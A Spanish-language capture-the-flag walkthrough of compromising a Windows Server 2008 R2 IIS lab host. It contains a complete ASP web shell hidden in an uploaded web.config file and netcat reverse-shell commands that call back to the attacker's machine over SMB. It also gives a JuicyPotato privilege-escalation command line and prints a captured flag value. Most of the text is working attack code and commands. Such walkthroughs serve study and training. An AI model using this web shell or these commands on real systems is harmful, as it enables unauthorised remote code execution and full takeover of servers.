Ejecutamos **nmap -sC -sS -sV -p- 10.0.50.42** para ver puertos abiertos
<!--
80/tcp    open  http          Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
-->

Hacemos fuzzing **gobuster dir -u http://10.0.50.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx**
Vemos en <!--/zoc.aspx             (Status: 200) [Size: 1159]--> que nos permite subir archivos
Si inspeccionamos esa pagina vemos un comentario <!--subiditosdetono--> es un directorio con web.config pero nos da 404
En la pagina de shell.aspx podemos subir png
Subiditosdetono es la direccion a la que se suben los archivos

WEbconfig que funciona
<!--
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" />
  </system.webServer>
</configuration>
-->

Al saber que podemos subir archivos .config probamos a subir un config con codigo RCE, seria el siguiente

<!--
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>
<%Response.write("<!-"&"-") %>
-->

Lo subimos y ya no vemos el listado en Subiditosdetono , pero lo metemos en el URL y tenemos RCE

Entramos y ejecutamos **whoami /priv** vemos <!--SeImpersonatePrivilege-->Podemos suplantar un usuario tras la autenticacion.
Lo haremos con JuicyPotato ya que hemos visto que la version de nuestro SO es Microsoft Windows Server 2008 R2 Datacenter  con **systeminfo** de x64 vulnerable a JuicyPotato.

Copiamos el nc a nuestro directorio de trabajo**cp /usr/share/windows-resources/binaries/nc.exe**
Creamos directorio compartido **impacket-smbserver -smb2support sharedFolder**
Para confirmarlo en la webshell **dir \\10.0.50.4\share** y vemos los archivos que hay, tenemos nuestra JuicyPotato y Nc64.exe listos.
Ahora deberemos copiarlos , en la webshell ponemos 
**copy \\10.0.50.4\share\JuicyPotato.exe C:\Windows\Temp\JuicyPotato.exe**
Para confirmar miramos **dir C:\Windows\Temp**

Ponemos listener en kali **nc -lvnp 443**
En la victima **\\10.0.50.4\sharedFolder\nc.exe -e cmd 10.0.50.4 443**

Tenemos acceso

Ejecutamos **dir C:\Users** y vemos carpetas Administrador y e Info de nuestro usuario actual
Navegamos a la carpeta users/info y vemos la user flag en user.txt <!--uigsg5sdfdfbv5b6sad98vcdf-->

Ahora escalaremos a Authority/System para leer la flag de Root.exe
Abrimos otro listener.
Vamos a la carpeta donde copiamos nuestro JuicyPotato y ejecutamos **JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "-e cmd 10.0.50.4 443" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}**

Somos System

Vamos al directorios  Directorio de C:\Users\Administrador\Desktop y leemos la flag de root 
